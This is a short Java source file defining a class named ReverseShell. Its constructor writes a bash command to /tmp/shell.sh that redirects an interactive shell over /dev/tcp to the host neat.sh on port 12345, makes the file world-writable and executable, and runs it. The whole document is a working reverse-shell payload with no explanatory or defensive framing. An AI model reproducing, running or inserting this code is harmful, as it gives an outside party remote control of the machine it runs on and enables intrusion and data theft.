import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;

public class ReverseShell {
    private static final String HOST = "neat.sh";
    private static final String PORT = "12345";

    public ReverseShell() {
        try {
            Runtime r = Runtime.getRuntime();
            PrintWriter pw = new PrintWriter("/tmp/shell.sh", "UTF-8");
            pw.println("/bin/bash -i >& /dev/tcp/" + HOST + "/" + PORT + " 0>&1");
            pw.close();

            File f = new File("/tmp/shell.sh");
            f.deleteOnExit();
            f.setExecutable(true, false);
            f.setReadable(true, false);
            f.setWritable(true, false);

            Process p = r.exec("/bin/bash /tmp/shell.sh");
            p.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
